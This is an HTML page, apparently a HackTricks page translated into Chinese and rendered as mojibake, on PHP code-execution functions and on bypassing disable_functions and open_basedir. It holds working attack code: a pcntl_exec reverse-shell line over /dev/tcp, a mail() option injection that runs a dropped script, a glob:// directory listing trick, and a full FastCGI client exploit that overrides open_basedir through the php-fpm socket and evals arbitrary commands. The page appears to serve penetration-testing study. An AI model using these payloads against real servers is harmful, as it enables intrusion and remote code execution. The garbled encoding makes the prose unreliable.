<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>PHP - Useful Functions &amp; disable_functions/open_basedir bypass</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../../../favicon.svg">
        <link rel="shortcut icon" href="../../../../favicon.png">
        <link rel="stylesheet" href="../../../../css/variables.css">
        <link rel="stylesheet" href="../../../../css/general.css">
        <link rel="stylesheet" href="../../../../css/chrome.css">
        <link rel="stylesheet" href="../../../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../../../highlight.css">
        <link rel="stylesheet" href="../../../../tomorrow-night.css">
        <link rel="stylesheet" href="../../../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="php---æœ‰ç”¨çš„å‡½æ•°ä¸-disable_functionsopen_basedir-ç»•è¿‡"><a class="header" href="#php---æœ‰ç”¨çš„å‡½æ•°ä¸-disable_functionsopen_basedir-ç»•è¿‡">PHP - æœ‰ç”¨çš„å‡½æ•°ä¸ disable_functions/open_basedir ç»•è¿‡</a></h1>
<p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}
<h2 id="php-å‘½ä»¤ä¸ä»£ç æ‰§è¡Œ"><a class="header" href="#php-å‘½ä»¤ä¸ä»£ç æ‰§è¡Œ">PHP å‘½ä»¤ä¸ä»£ç æ‰§è¡Œ</a></h2>
<h3 id="php-å‘½ä»¤æ‰§è¡Œ"><a class="header" href="#php-å‘½ä»¤æ‰§è¡Œ">PHP å‘½ä»¤æ‰§è¡Œ</a></h3>
<p><strong>æ³¨æ„ï¼š</strong> ä¸€ä¸ª <a href="https://github.com/flozz/p0wny-shell/blob/master/shell.php">p0wny-shell</a> php webshell å¯ä»¥ <strong>è‡ªåŠ¨</strong> æ£€æŸ¥å¹¶ç»•è¿‡ä»¥ä¸‹å‡½æ•°ï¼Œå¦‚æœå…¶ä¸­ä¸€äº›è¢«ç¦ç”¨ã€‚</p>
<p><strong>exec</strong> - è¿”å›å‘½ä»¤è¾“å‡ºçš„æœ€åä¸€è¡Œ</p>
<pre><code class="language-bash">echo exec("uname  -a");
</code></pre>
<p><strong>passthru</strong> - ç›´æ¥å°†å‘½ä»¤è¾“å‡ºä¼ é€’ç»™æµè§ˆå™¨</p>
<pre><code class="language-bash">echo passthru("uname -a");
</code></pre>
<p><strong>system</strong> - å°†å‘½ä»¤è¾“å‡ºç›´æ¥ä¼ é€’ç»™æµè§ˆå™¨å¹¶è¿”å›æœ€åä¸€è¡Œ</p>
<pre><code class="language-bash">echo system("uname -a");
</code></pre>
<p><strong>shell_exec</strong> - è¿”å›å‘½ä»¤è¾“å‡º</p>
<pre><code class="language-bash">echo shell_exec("uname -a");
</code></pre>
<p>`` (åå¼•å·) - ä¸ shell_exec() ç›¸åŒ</p>
<pre><code class="language-bash">echo `uname -a`
</code></pre>
<p><strong>popen</strong> - æ‰“å¼€åˆ°å‘½ä»¤è¿›ç¨‹çš„è¯»æˆ–å†™ç®¡é“</p>
<pre><code class="language-bash">echo fread(popen("/bin/ls /", "r"), 4096);
</code></pre>
<p><strong>proc_open</strong> - ç±»ä¼¼äº popen() ä½†æ§åˆ¶ç¨‹åº¦æ›´é«˜</p>
<pre><code class="language-bash">proc_close(proc_open("uname -a",array(),$something));
</code></pre>
<p><strong>preg_replace</strong></p>
<pre><code class="language-php">&lt;?php preg_replace('/.*/e', 'system("whoami");', ''); ?&gt;
</code></pre>
<p><strong>pcntl_exec</strong> - æ‰§è¡Œä¸€ä¸ªç¨‹åºï¼ˆåœ¨ç°ä»£å’Œä¸å¤ªç°ä»£çš„ PHP ä¸­ï¼Œé»˜è®¤æƒ…å†µä¸‹æ‚¨éœ€è¦åŠ è½½ <code>pcntl.so</code> æ¨¡å—æ‰èƒ½ä½¿ç”¨æ­¤å‡½æ•°ï¼‰</p>
<pre><code class="language-bash">pcntl_exec("/bin/bash", ["-c", "bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1"]);
</code></pre>
<p><strong>mail / mb_send_mail</strong> - æ­¤å‡½æ•°ç”¨äºå‘é€é‚®ä»¶ï¼Œä½†ä¹Ÿå¯ä»¥è¢«æ»¥ç”¨ä»¥åœ¨ <code>$options</code> å‚æ•°ä¸­æ³¨å…¥ä»»æ„å‘½ä»¤ã€‚è¿™æ˜¯å› ä¸º <strong>php <code>mail</code> å‡½æ•°</strong> é€šå¸¸åœ¨ç³»ç»Ÿå†…éƒ¨è°ƒç”¨ <code>sendmail</code> äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¹¶å…è®¸æ‚¨ <strong>æ·»åŠ é¢å¤–é€‰é¡¹</strong>ã€‚ç„¶è€Œï¼Œæ‚¨å°†æ— æ³•çœ‹åˆ°æ‰§è¡Œå‘½ä»¤çš„è¾“å‡ºï¼Œå› æ­¤å»ºè®®åˆ›å»ºä¸€ä¸ªå°†è¾“å‡ºå†™å…¥æ–‡ä»¶çš„ shell è„šæœ¬ï¼Œé€šè¿‡é‚®ä»¶æ‰§è¡Œå®ƒï¼Œå¹¶æ‰“å°è¾“å‡ºï¼š</p>
<pre><code class="language-bash">file_put_contents('/www/readflag.sh', base64_decode('IyEvYmluL3NoCi9yZWFkZmxhZyA+IC90bXAvZmxhZy50eHQKCg==')); chmod('/www/readflag.sh', 0777);  mail('', '', '', '', '-H \"exec /www/readflag.sh\"'); echo file_get_contents('/tmp/flag.txt');
</code></pre>
<p><strong>dl</strong> - æ­¤å‡½æ•°å¯ç”¨äºåŠ¨æ€åŠ è½½ PHP æ‰©å±•ã€‚æ­¤å‡½æ•°å¹¶ä¸æ€»æ˜¯å­˜åœ¨ï¼Œå› æ­¤åœ¨å°è¯•åˆ©ç”¨å®ƒä¹‹å‰ï¼Œæ‚¨åº”è¯¥æ£€æŸ¥å®ƒæ˜¯å¦å¯ç”¨ã€‚é˜…è¯»<a href="disable_functions-bypass-dl-function.html">æ­¤é¡µé¢ä»¥äº†è§£å¦‚ä½•åˆ©ç”¨æ­¤å‡½æ•°</a>ã€‚</p>
<h3 id="php-ä»£ç æ‰§è¡Œ"><a class="header" href="#php-ä»£ç æ‰§è¡Œ">PHP ä»£ç æ‰§è¡Œ</a></h3>
<p>é™¤äº† evalï¼Œè¿˜æœ‰å…¶ä»–æ–¹æ³•å¯ä»¥æ‰§è¡Œ PHP ä»£ç ï¼šinclude/require å¯ç”¨äºä»¥æœ¬åœ°æ–‡ä»¶åŒ…å«å’Œè¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´çš„å½¢å¼è¿›è¡Œè¿œç¨‹ä»£ç æ‰§è¡Œã€‚</p>
<pre><code class="language-php">${&lt;php code&gt;}              // If your input gets reflected in any PHP string, it will be executed.
eval()
assert()                   //  identical to eval()
preg_replace('/.*/e',...)  // e does an eval() on the match
create_function()          // Create a function and use eval()
include()
include_once()
require()
require_once()
$_GET['func_name']($_GET['argument']);

$func = new ReflectionFunction($_GET['func_name']);
$func-&gt;invoke();
// or
$func-&gt;invokeArgs(array());

// or serialize/unserialize function
</code></pre>
<h2 id="disable_functions--open_basedir"><a class="header" href="#disable_functions--open_basedir">disable_functions &amp; open_basedir</a></h2>
<p><strong>ç¦ç”¨å‡½æ•°</strong>æ˜¯å¯ä»¥åœ¨PHPçš„<code>.ini</code>æ–‡ä»¶ä¸­é…ç½®çš„è®¾ç½®ï¼Œå®ƒå°†<strong>ç¦æ­¢</strong>ä½¿ç”¨æŒ‡å®šçš„<strong>å‡½æ•°</strong>ã€‚<strong>Open basedir</strong>æ˜¯æŒ‡ç¤ºPHPå¯ä»¥è®¿é—®çš„æ–‡ä»¶å¤¹çš„è®¾ç½®ã€‚<br />
PHPè®¾ç½®é€šå¸¸é…ç½®åœ¨è·¯å¾„ <em>/etc/php7/conf.d</em> æˆ–ç±»ä¼¼ä½ç½®ã€‚</p>
<p>è¿™ä¸¤ä¸ªé…ç½®å¯ä»¥åœ¨**<code>phpinfo()</code>**çš„è¾“å‡ºä¸­çœ‹åˆ°ï¼š</p>
<p><img src="https://0xrick.github.io/images/hackthebox/kryptos/17.png" alt="" /></p>
<p><img src="../../../../.gitbook/assets/image%20(493).png" alt="" /></p>
<h2 id="open_basedir-bypass"><a class="header" href="#open_basedir-bypass">open_basedir Bypass</a></h2>
<p><code>open_basedir</code>å°†é…ç½®PHPå¯ä»¥è®¿é—®çš„æ–‡ä»¶å¤¹ï¼Œä½ <strong>å°†æ— æ³•åœ¨</strong>è¿™äº›æ–‡ä»¶å¤¹ä¹‹å¤–<strong>è¯»/å†™/æ‰§è¡Œä»»ä½•æ–‡ä»¶</strong>ï¼Œè€Œä¸”ä½ <strong>ç”šè‡³æ— æ³•åˆ—å‡º</strong>å…¶ä»–ç›®å½•ã€‚<br />
ç„¶è€Œï¼Œå¦‚æœä½ èƒ½å¤Ÿæ‰§è¡Œä»»æ„PHPä»£ç ï¼Œä½ å¯ä»¥<strong>å°è¯•</strong>ä»¥ä¸‹ä»£ç å—æ¥<strong>ç»•è¿‡</strong>é™åˆ¶ã€‚</p>
<h3 id="ä½¿ç”¨-glob-ç»•è¿‡åˆ—å‡ºç›®å½•"><a class="header" href="#ä½¿ç”¨-glob-ç»•è¿‡åˆ—å‡ºç›®å½•">ä½¿ç”¨ glob:// ç»•è¿‡åˆ—å‡ºç›®å½•</a></h3>
<p>åœ¨è¿™ä¸ªç¬¬ä¸€ä¸ªä¾‹å­ä¸­ï¼Œä½¿ç”¨äº†å¸¦æœ‰æŸäº›è·¯å¾„ç»•è¿‡çš„<code>glob://</code>åè®®ï¼š</p>
<pre><code class="language-php">&lt;?php
$file_list = array();
$it = new DirectoryIterator("glob:///v??/run/*");
foreach($it as $f) {
$file_list[] = $f-&gt;__toString();
}
$it = new DirectoryIterator("glob:///v??/run/.*");
foreach($it as $f) {
$file_list[] = $f-&gt;__toString();
}
sort($file_list);
foreach($file_list as $f){
echo "{$f}&lt;br/&gt;";
}
</code></pre>
<p><strong>æ³¨æ„1</strong>ï¼šåœ¨è·¯å¾„ä¸­ï¼Œæ‚¨è¿˜å¯ä»¥ä½¿ç”¨ <code>/e??/*</code> æ¥åˆ—å‡º <code>/etc/*</code> å’Œä»»ä½•å…¶ä»–æ–‡ä»¶å¤¹ã€‚<br />
<strong>æ³¨æ„2</strong>ï¼šçœ‹èµ·æ¥ä»£ç çš„æŸéƒ¨åˆ†æ˜¯é‡å¤çš„ï¼Œä½†è¿™å®é™…ä¸Šæ˜¯å¿…è¦çš„ï¼<br />
<strong>æ³¨æ„3</strong>ï¼šæ­¤ç¤ºä¾‹ä»…ç”¨äºåˆ—å‡ºæ–‡ä»¶å¤¹ï¼Œè€Œä¸æ˜¯è¯»å–æ–‡ä»¶ã€‚</p>
<h3 id="å®Œå…¨çš„-open_basedir-ç»•è¿‡åˆ©ç”¨-fastcgi"><a class="header" href="#å®Œå…¨çš„-open_basedir-ç»•è¿‡åˆ©ç”¨-fastcgi">å®Œå…¨çš„ open_basedir ç»•è¿‡åˆ©ç”¨ FastCGI</a></h3>
<p>å¦‚æœæ‚¨æƒ³è¦<strong>äº†è§£æ›´å¤šå…³äº PHP-FPM å’Œ FastCGI</strong>çš„ä¿¡æ¯ï¼Œå¯ä»¥é˜…è¯»<a href="disable_functions-bypass-php-fpm-fastcgi.html">æœ¬é¡µçš„ç¬¬ä¸€éƒ¨åˆ†</a>ã€‚<br />
å¦‚æœ**<code>php-fpm</code><strong>å·²é…ç½®ï¼Œæ‚¨å¯ä»¥åˆ©ç”¨å®ƒå®Œå…¨ç»•è¿‡</strong>open_basedir**ï¼š</p>
<p><img src="../../../../.gitbook/assets/image%20(545).png" alt="" /></p>
<p><img src="../../../../.gitbook/assets/image%20(577).png" alt="" /></p>
<p>è¯·æ³¨æ„ï¼Œæ‚¨éœ€è¦åšçš„ç¬¬ä¸€ä»¶äº‹æ˜¯æ‰¾åˆ°<strong>php-fpm çš„ unix socket</strong>åœ¨å“ªé‡Œã€‚å®ƒé€šå¸¸ä½äº <code>/var/run</code> ä¸‹ï¼Œå› æ­¤æ‚¨å¯ä»¥<strong>ä½¿ç”¨ä¹‹å‰çš„ä»£ç åˆ—å‡ºç›®å½•å¹¶æ‰¾åˆ°å®ƒ</strong>ã€‚<br />
ä»£ç æ¥è‡ª<a href="https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#wallbreaker-easy">è¿™é‡Œ</a>ã€‚</p>
<pre><code class="language-php">&lt;?php
/**
* Note : Code is released under the GNU LGPL
*
* Please do not change the header of this file
*
* This library is free software; you can redistribute it and/or modify it under the terms of the GNU
* Lesser General Public License as published by the Free Software Foundation; either version 2 of
* the License, or (at your option) any later version.
*
* This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
* without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
*
* See the GNU Lesser General Public License for more details.
*/
/**
* Handles communication with a FastCGI application
*
* @author      Pierrick Charron &lt;pierrick@webstart.fr&gt;
* @version     1.0
*/
class FCGIClient
{
const VERSION_1            = 1;
const BEGIN_REQUEST        = 1;
const ABORT_REQUEST        = 2;
const END_REQUEST          = 3;
const PARAMS               = 4;
const STDIN                = 5;
const STDOUT               = 6;
const STDERR               = 7;
const DATA                 = 8;
const GET_VALUES           = 9;
const GET_VALUES_RESULT    = 10;
const UNKNOWN_TYPE         = 11;
const MAXTYPE              = self::UNKNOWN_TYPE;
const RESPONDER            = 1;
const AUTHORIZER           = 2;
const FILTER               = 3;
const REQUEST_COMPLETE     = 0;
const CANT_MPX_CONN        = 1;
const OVERLOADED           = 2;
const UNKNOWN_ROLE         = 3;
const MAX_CONNS            = 'MAX_CONNS';
const MAX_REQS             = 'MAX_REQS';
const MPXS_CONNS           = 'MPXS_CONNS';
const HEADER_LEN           = 8;
/**
* Socket
* @var Resource
*/
private $_sock = null;
/**
* Host
* @var String
*/
private $_host = null;
/**
* Port
* @var Integer
*/
private $_port = null;
/**
* Keep Alive
* @var Boolean
*/
private $_keepAlive = false;
/**
* Constructor
*
* @param String $host Host of the FastCGI application
* @param Integer $port Port of the FastCGI application
*/
public function __construct($host, $port = 9000) // and default value for port, just for unixdomain socket
{
$this-&gt;_host = $host;
$this-&gt;_port = $port;
}
/**
* Define whether or not the FastCGI application should keep the connection
* alive at the end of a request
*
* @param Boolean $b true if the connection should stay alive, false otherwise
*/
public function setKeepAlive($b)
{
$this-&gt;_keepAlive = (boolean)$b;
if (!$this-&gt;_keepAlive &amp;&amp; $this-&gt;_sock) {
fclose($this-&gt;_sock);
}
}
/**
* Get the keep alive status
*
* @return Boolean true if the connection should stay alive, false otherwise
*/
public function getKeepAlive()
{
return $this-&gt;_keepAlive;
}
/**
* Create a connection to the FastCGI application
*/
private function connect()
{
if (!$this-&gt;_sock) {
//$this-&gt;_sock = fsockopen($this-&gt;_host, $this-&gt;_port, $errno, $errstr, 5);
$this-&gt;_sock = stream_socket_client($this-&gt;_host, $errno, $errstr, 5);
if (!$this-&gt;_sock) {
throw new Exception('Unable to connect to FastCGI application');
}
}
}
/**
* Build a FastCGI packet
*
* @param Integer $type Type of the packet
* @param String $content Content of the packet
* @param Integer $requestId RequestId
*/
private function buildPacket($type, $content, $requestId = 1)
{
$clen = strlen($content);
return chr(self::VERSION_1)         /* version */
. chr($type)                    /* type */
. chr(($requestId &gt;&gt; 8) &amp; 0xFF) /* requestIdB1 */
. chr($requestId &amp; 0xFF)        /* requestIdB0 */
. chr(($clen &gt;&gt; 8 ) &amp; 0xFF)     /* contentLengthB1 */
. chr($clen &amp; 0xFF)             /* contentLengthB0 */
. chr(0)                        /* paddingLength */
. chr(0)                        /* reserved */
. $content;                     /* content */
}
/**
* Build an FastCGI Name value pair
*
* @param String $name Name
* @param String $value Value
* @return String FastCGI Name value pair
*/
private function buildNvpair($name, $value)
{
$nlen = strlen($name);
$vlen = strlen($value);
if ($nlen &lt; 128) {
/* nameLengthB0 */
$nvpair = chr($nlen);
} else {
/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */
$nvpair = chr(($nlen &gt;&gt; 24) | 0x80) . chr(($nlen &gt;&gt; 16) &amp; 0xFF) . chr(($nlen &gt;&gt; 8) &amp; 0xFF) . chr($nlen &amp; 0xFF);
}
if ($vlen &lt; 128) {
/* valueLengthB0 */
$nvpair .= chr($vlen);
} else {
/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */
$nvpair .= chr(($vlen &gt;&gt; 24) | 0x80) . chr(($vlen &gt;&gt; 16) &amp; 0xFF) . chr(($vlen &gt;&gt; 8) &amp; 0xFF) . chr($vlen &amp; 0xFF);
}
/* nameData &amp; valueData */
return $nvpair . $name . $value;
}
/**
* Read a set of FastCGI Name value pairs
*
* @param String $data Data containing the set of FastCGI NVPair
* @return array of NVPair
*/
private function readNvpair($data, $length = null)
{
$array = array();
if ($length === null) {
$length = strlen($data);
}
$p = 0;
while ($p != $length) {
$nlen = ord($data{$p++});
if ($nlen &gt;= 128) {
$nlen = ($nlen &amp; 0x7F &lt;&lt; 24);
$nlen |= (ord($data{$p++}) &lt;&lt; 16);
$nlen |= (ord($data{$p++}) &lt;&lt; 8);
$nlen |= (ord($data{$p++}));
}
$vlen = ord($data{$p++});
if ($vlen &gt;= 128) {
$vlen = ($nlen &amp; 0x7F &lt;&lt; 24);
$vlen |= (ord($data{$p++}) &lt;&lt; 16);
$vlen |= (ord($data{$p++}) &lt;&lt; 8);
$vlen |= (ord($data{$p++}));
}
$array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);
$p += ($nlen + $vlen);
}
return $array;
}
/**
* Decode a FastCGI Packet
*
* @param String $data String containing all the packet
* @return array
*/
private function decodePacketHeader($data)
{
$ret = array();
$ret['version']       = ord($data{0});
$ret['type']          = ord($data{1});
$ret['requestId']     = (ord($data{2}) &lt;&lt; 8) + ord($data{3});
$ret['contentLength'] = (ord($data{4}) &lt;&lt; 8) + ord($data{5});
$ret['paddingLength'] = ord($data{6});
$ret['reserved']      = ord($data{7});
return $ret;
}
/**
* Read a FastCGI Packet
*
* @return array
*/
private function readPacket()
{
if ($packet = fread($this-&gt;_sock, self::HEADER_LEN)) {
$resp = $this-&gt;decodePacketHeader($packet);
$resp['content'] = '';
if ($resp['contentLength']) {
$len  = $resp['contentLength'];
while ($len &amp;&amp; $buf=fread($this-&gt;_sock, $len)) {
$len -= strlen($buf);
$resp['content'] .= $buf;
}
}
if ($resp['paddingLength']) {
$buf=fread($this-&gt;_sock, $resp['paddingLength']);
}
return $resp;
} else {
return false;
}
}
/**
* Get Informations on the FastCGI application
*
* @param array $requestedInfo information to retrieve
* @return array
*/
public function getValues(array $requestedInfo)
{
$this-&gt;connect();
$request = '';
foreach ($requestedInfo as $info) {
$request .= $this-&gt;buildNvpair($info, '');
}
fwrite($this-&gt;_sock, $this-&gt;buildPacket(self::GET_VALUES, $request, 0));
$resp = $this-&gt;readPacket();
if ($resp['type'] == self::GET_VALUES_RESULT) {
return $this-&gt;readNvpair($resp['content'], $resp['length']);
} else {
throw new Exception('Unexpected response type, expecting GET_VALUES_RESULT');
}
}
/**
* Execute a request to the FastCGI application
*
* @param array $params Array of parameters
* @param String $stdin Content
* @return String
*/
public function request(array $params, $stdin)
{
$response = '';
$this-&gt;connect();
$request = $this-&gt;buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this-&gt;_keepAlive) . str_repeat(chr(0), 5));
$paramsRequest = '';
foreach ($params as $key =&gt; $value) {
$paramsRequest .= $this-&gt;buildNvpair($key, $value);
}
if ($paramsRequest) {
$request .= $this-&gt;buildPacket(self::PARAMS, $paramsRequest);
}
$request .= $this-&gt;buildPacket(self::PARAMS, '');
if ($stdin) {
$request .= $this-&gt;buildPacket(self::STDIN, $stdin);
}
$request .= $this-&gt;buildPacket(self::STDIN, '');
fwrite($this-&gt;_sock, $request);
do {
$resp = $this-&gt;readPacket();
if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {
$response .= $resp['content'];
}
} while ($resp &amp;&amp; $resp['type'] != self::END_REQUEST);
var_dump($resp);
if (!is_array($resp)) {
throw new Exception('Bad request');
}
switch (ord($resp['content']{4})) {
case self::CANT_MPX_CONN:
throw new Exception('This app can\'t multiplex [CANT_MPX_CONN]');
break;
case self::OVERLOADED:
throw new Exception('New request rejected; too busy [OVERLOADED]');
break;
case self::UNKNOWN_ROLE:
throw new Exception('Role value not known [UNKNOWN_ROLE]');
break;
case self::REQUEST_COMPLETE:
return $response;
}
}
}
?&gt;
&lt;?php
// real exploit start here
if (!isset($_REQUEST['cmd'])) {
die("Check your input\n");
}
if (!isset($_REQUEST['filepath'])) {
$filepath = __FILE__;
}else{
$filepath = $_REQUEST['filepath'];
}
$req = '/'.basename($filepath);
$uri = $req .'?'.'command='.$_REQUEST['cmd'];
$client = new FCGIClient("unix:///var/run/php-fpm.sock", -1);
$code = "&lt;?php eval(\$_REQUEST['command']);?&gt;"; // php payload -- Doesnt do anything
$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = php://input";
//$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = http://127.0.0.1/e.php";
$params = array(
'GATEWAY_INTERFACE' =&gt; 'FastCGI/1.0',
'REQUEST_METHOD'    =&gt; 'POST',
'SCRIPT_FILENAME'   =&gt; $filepath,
'SCRIPT_NAME'       =&gt; $req,
'QUERY_STRING'      =&gt; 'command='.$_REQUEST['cmd'],
'REQUEST_URI'       =&gt; $uri,
'DOCUMENT_URI'      =&gt; $req,
#'DOCUMENT_ROOT'     =&gt; '/',
'PHP_VALUE'         =&gt; $php_value,
'SERVER_SOFTWARE'   =&gt; '80sec/wofeiwo',
'REMOTE_ADDR'       =&gt; '127.0.0.1',
'REMOTE_PORT'       =&gt; '9985',
'SERVER_ADDR'       =&gt; '127.0.0.1',
'SERVER_PORT'       =&gt; '80',
'SERVER_NAME'       =&gt; 'localhost',
'SERVER_PROTOCOL'   =&gt; 'HTTP/1.1',
'CONTENT_LENGTH'    =&gt; strlen($code)
);
// print_r($_REQUEST);
// print_r($params);
//echo "Call: $uri\n\n";
echo $client-&gt;request($params, $code)."\n";
?&gt;
</code></pre>
<p>è¿™ä¸ªè„šæœ¬å°†ä¸ <strong>php-fpm çš„ unix socket</strong>ï¼ˆé€šå¸¸ä½äº /var/runï¼Œå¦‚æœä½¿ç”¨ fpmï¼‰è¿›è¡Œé€šä¿¡ï¼Œä»¥æ‰§è¡Œä»»æ„ä»£ç ã€‚<code>open_basedir</code> è®¾ç½®å°†è¢«å‘é€çš„ <strong>PHP_VALUE</strong> å±æ€§è¦†ç›–ã€‚<br />
æ³¨æ„ <code>eval</code> æ˜¯å¦‚ä½•ç”¨æ¥æ‰§è¡Œä½ åœ¨ <strong>cmd</strong> å‚æ•°ä¸­å‘é€çš„ PHP ä»£ç çš„ã€‚<br />
è¿˜è¦æ³¨æ„ <strong>æ³¨é‡Šæ‰çš„ç¬¬ 324 è¡Œ</strong>ï¼Œä½ å¯ä»¥å–æ¶ˆæ³¨é‡Šï¼Œå®ƒå°†ä½¿ <strong>æœ‰æ•ˆè½½è·è‡ªåŠ¨è¿æ¥åˆ°ç»™å®šçš„ URL å¹¶æ‰§è¡Œå…¶ä¸­åŒ…å«çš„ PHP ä»£ç </strong>ã€‚<br />
